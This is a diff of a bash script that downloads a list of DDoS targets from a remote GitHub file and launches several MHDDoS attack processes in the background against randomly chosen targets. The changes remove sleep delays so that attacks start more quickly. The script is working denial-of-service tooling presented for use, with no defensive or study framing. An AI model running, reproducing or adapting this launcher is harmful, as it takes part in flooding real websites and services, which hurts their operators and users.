@@ -45,11 +45,8 @@ do
    do
              site=$(awk 'NR=='"$i" <<< "$(curl -s https://raw.githubusercontent.com/KarboDuck/karbo-wiki/master/MHDDoS_targets | cat | tail -n +6)")
              echo -e $site"\n"
-             sleep 0.2
    done
-   
-   sleep 2
-   
+      
    # Launch multiple MHDDoS instances. Targets choosed based on previosly generated list of random numbers.
    for i in $random_numbers
    do
@@ -60,7 +57,6 @@ do
             cmd_line=$(echo $site | awk -F "#" '{print $1}')
             
             #echo $cmd_line
-            sleep 1
             
             python3 ~/MHDDoS/start.py $cmd_line&
    done
